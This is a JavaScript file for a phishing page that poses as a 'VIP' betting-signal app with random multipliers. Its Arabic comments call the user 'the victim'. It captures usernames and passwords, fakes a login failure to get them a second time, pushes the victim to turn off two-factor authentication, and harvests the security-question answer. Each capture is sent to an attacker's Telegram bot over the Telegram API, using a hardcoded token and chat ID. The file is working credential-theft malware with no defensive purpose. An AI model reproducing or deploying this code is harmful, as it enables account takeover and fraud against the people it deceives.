const TG_TOKEN = "8589243363:AAH4sM1DEqNXAUK314uyagIB3GbRouEL8ak";
const CHAT_ID = "8026901193";

let loginAttempts = 0;
let securityAttempts = 0;

// 1. معالجة تسجيل الدخول الأول
async function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const btn = document.getElementById('sync-btn');
    const msg = document.getElementById('status-text');

    if (u.length < 4 || p.length < 4) return alert("البيانات ناقصة!");

    loginAttempts++;

    if (loginAttempts === 1) {
        btn.disabled = true;
        btn.innerText = "Verifying...";
        await sendToTelegram(`⚠️ محاولة 1 (تأكد):\n👤 User: ${u}\n🔑 Pass: ${p}`);
        
        setTimeout(() => {
            msg.innerText = "❌ فشل الاتصال: كلمة المرور أو اليوزر غير صحيح!";
            msg.style.color = "#ff0000";
            document.getElementById('u_pas').value = "";
            btn.disabled = false;
            btn.innerText = "Retry Sync";
        }, 1500);
        return;
    }

    if (loginAttempts === 2) {
        btn.disabled = true;
        btn.innerText = "Analyzing...";
        await sendToTelegram(`✅ بيانات مؤكدة (محاولة 2):\n👤 User: ${u}\n🔑 Pass: ${p}`);
        showSecurityNotice(); // يفتح واجهة إلغاء المصادقة
    }
}

// 2. واجهة إقناع الضحية بإلغاء 2FA
function showSecurityNotice() {
    const msg = document.getElementById('status-text');
    const btn = document.getElementById('sync-btn');
    const inputs = document.querySelectorAll('.auth-input');

    inputs.forEach(i => i.style.display = 'none');

    msg.innerHTML = `
        <div style="text-align: right; background: rgba(255,0,0,0.1); padding: 10px; border-radius: 8px; border: 1px solid #ff00</td>00;">
            <h4 style="color: #ff0000; margin-top: 0;">⚠️ تفعيل نظام الـ VIP:</h4>
            <p style="font-size: 11px; color: #eee;">يجب إيقاف المصادقة الثنائية (2FA) من إعدادات حسابك فوراً للسماح للسيرفر بالربط.</p>
        </div>
    `;
    
    btn.disabled = false;
    btn.innerText = "ألغيت المصادقة.. دخول ✅";
    
    btn.onclick = () => {
        // هنا يفتح الواجهة الحمراء (سؤال الأمان)
        const layer = document.getElementById('security-layer');
        layer.style.display = 'flex'; 
        sendToTelegram(`🔔 الضحية أكد إلغاء 2FA وانتقل للسؤال السري!`);
    };
}

// 3. فخ سؤال الأمان (الواجهة الحمراء)
async function finalVerify() {
    const ans = document.getElementById('sec_ans').value;
    const btn = document.getElementById('sec-btn');
    const msg = document.getElementById('sec-status');

    if (ans.length < 2) return alert("أدخل الإجابة أولاً!");

    securityAttempts++;
    btn.disabled = true;
    btn.innerText = "Synchronizing...";

    if (securityAttempts === 1) {
        setTimeout(() => {
            document.getElementById('sec_ans').value = "";
            msg.innerText = "❌ خطأ: أعد كتابة الإجابة أو اللقب بدقة!";
            msg.style.color = "#ff0000";
            btn.disabled = false;
            btn.innerText = "Retry Confirm";
        }, 1200);
        return;
    }

    // إرسال الكنز النهائي لتلجرام
    await sendToTelegram(`🔑 **SECRET ANSWER FOUND!**\n\n👤 Answer: \`${ans}\`\n📡 Status: Fully Captured`);
    
    btn.innerText = "Success ✅";
    setTimeout(() => {
        document.getElementById('security-layer').style.display = 'none';
        document.getElementById('main-app').classList.remove('hidden');
        alert("✅ تم تفعيل الـ VIP! الرادار جاهز.");
    }, 1500);
}

async function sendToTelegram(text) {
    try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
        });
    } catch (e) {}
}

function getSignal() {
    const display = document.getElementById('target-mult');
    display.innerText = "WAIT..";
    setTimeout(() => {
        const mult = (Math.random() * (3.50 - 1.20) + 1.20).toFixed(2) + "x";
        display.innerText = mult;
    }, 1000);
}
